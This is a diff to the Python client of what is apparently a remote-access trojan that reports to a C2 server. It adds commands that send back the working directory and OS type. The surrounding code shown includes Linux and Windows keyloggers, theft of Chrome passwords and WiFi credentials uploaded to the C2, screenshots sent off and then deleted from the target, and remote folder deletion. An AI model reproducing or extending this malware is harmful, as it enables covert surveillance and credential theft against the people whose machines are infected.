@@ -31,7 +31,6 @@ def recv_eff():
 	while True:
 		try:
 			data = data + sock.recv(1024).decode('utf-8').rstrip()        # decoding data and striping out EOL spacing
-
 			return json.loads(data)
 
 		except ValueError:
@@ -78,7 +77,6 @@ def download_file(file_name):
 def upload_file(file_name):
 
 	file = open(file_name, 'rb')
-
 	sock.send(file.read())
 
 
@@ -86,7 +84,6 @@ def upload_file(file_name):
 def screenshot():
 
 	img = PIL.ImageGrab.grab()
-
 	img.save(r'scrn_sht.png')
 
 
@@ -100,7 +97,6 @@ def lnx_keylog(cmd):
 
 		l_keylog = Lnx_Keylogger()
 		t = threading.Thread(target=l_keylog.keylog_start)
-
 		t.start()
 
 		send_eff(colored("[+] Keylogger started!!",'green'))
@@ -118,9 +114,7 @@ def lnx_keylog(cmd):
 	elif cmd[:10] == 'keylog_off' and len(cmd) > 1:
 
 		l_keylog =  Lnx_Keylogger()
-
 		l_keylog.keylog_off_self_destruct()
-
 		t.join()
 
 		send_eff(colored("[+] Keylogger stopped!!", 'green'))
@@ -137,7 +131,6 @@ def win_keylog(cmd):
 
 		w_keylog = Win_Keylogger()
 		t = threading.Thread(target=w_keylog.keylog_start)
-
 		t.start()
 
 		send_eff(colored("[+] Keylogger started!!",'green'))
@@ -155,9 +148,7 @@ def win_keylog(cmd):
 	elif cmd[:10] == 'keylog_off' and len(cmd) > 1:
 
 		w_keylog =  Win_Keylogger()
-
 		w_keylog.keylog_off_self_destruct()
-
 		t.join()
 
 		send_eff(colored("[+] Keylogger stopped!!", 'green'))
@@ -188,7 +179,6 @@ def shell():
 		elif cmd[:5] == "touch" and len(cmd) > 1:
 
 			file = open(cmd[6:], "w")
-
 			file.close()
 
 
@@ -197,19 +187,28 @@ def shell():
 
 			try:
 				os.chdir(cmd[3:])        # we know that after changing direc nothing is shown in terminal/cmd,
-						         # so we have to send nothing back to C2 Server
-
+						         		 # so we have to send nothing back to C2 Server\
 			except:
 				continue
+
+		# Knowing the present working r=directory ✓
+		elif cmd[:3] == 'pwd' and len(cmd) > 1:
+
+			pwd = os.getcwd()
+			send_eff(pwd)
+
+		# Knowing the trgt OS type
+		elif cmd[:7] == "os_type" and len(cmd) > 1:
+
+			Type = os.name
+			send_eff(Type)
 
 		# Removing folder in linux and Win   ✓
 		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):
 
 			try:
 				pwd = os.getcwd()
-
 				abs_path = pwd + '/' + cmd[6:]
-
 				shutil.rmtree(abs_path)
 
 			except:
@@ -234,7 +233,6 @@ def shell():
 			win_chrome_password_extractor.main()
 
 			upload_file('chrome_creds.txt')              # sending file with creds to C2 
-
 			os.remove('chrome_creds.txt')                # removing the file
 
 
@@ -261,7 +259,6 @@ def shell():
 			data = Main()
 
 			u_profiles= []                # creating empty list for storing SSID names
-
 			list_profiles = []            # creating empty list for storing multiple users' creds
 
 			# looping through wifi profile names
@@ -270,7 +267,6 @@ def shell():
 				if "All User Profile" in i:
 
 					u_profile = i.split(":")[1][1:-1] # stripping out SSID name
-
 					u_profiles.append(u_profile)
 
 			for j in u_profiles:
@@ -292,9 +288,11 @@ def shell():
 			if os.name == 'nt':
 
 				# ADD list of preferred processes you want to scan
-				prf_list = ["chrome.exe", "notepad.exe", "cmd.exe", "Taskmgr.exe", "calculator.exe" ]
+				prf_list = ["chrome.exe", "notepad.exe", "cmd.exe", "Taskmgr.exe", "calculator.exe" ] # "calculator.exe", 
 
 				info_list = getting_info(prf_list)
+
+				#print(info_list)
 
 				send_eff(info_list)
 				send_eff(prf_list)
@@ -306,9 +304,7 @@ def shell():
 		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
 
 			screenshot()                     # Taking screenshot
-
 			upload_file('scrn_sht.png')      # sending the ss to C2
-
 			os.remove('scrn_sht.png')        # removing the ss from trgt
 
 
@@ -357,4 +353,5 @@ def main():
 
 if __name__ == '__main__':
 	main()
+
 
